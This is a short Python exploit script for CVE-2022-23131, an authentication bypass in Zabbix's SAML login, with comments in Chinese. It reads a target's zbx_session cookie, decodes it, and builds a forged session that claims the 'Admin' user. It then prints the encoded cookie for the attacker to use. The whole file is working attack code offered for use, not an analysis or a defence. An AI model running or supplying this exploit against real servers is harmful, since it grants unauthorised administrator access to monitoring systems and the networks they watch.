# coding
import sys
import requests
import re,base64,urllib.parse,json
# 禁用警告from requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def runPoc(url):
    response = requests.get(url,verify=False)
    cookie = response.headers.get("Set-Cookie")
    sessionReg = re.compile("zbx_session=(.*?);")
    try:
        session = re.findall(sessionReg,cookie)[0]
        base64_decode = base64.b64decode(urllib.parse.unquote(session,encoding="utf-8"))
        session_json = json.loads(base64_decode)
        payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"%s","sign":"%s"}'%(session_json["sessionid"],session_json["sign"])
        print("未加密Payload：" + payload)
        print('n')
        payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))
        print("加密后Payload：" + payload_encode)
    except IndexError:
        print("[-] 不存在漏洞")
if __name__ == '__main__':
    try:
        url = sys.argv[1]
        runPoc(url)
    except IndexError:
        print("""    Use: python CVE-2022-23131.py http://xxxxxxxxx.com   By:MrHatSec""")
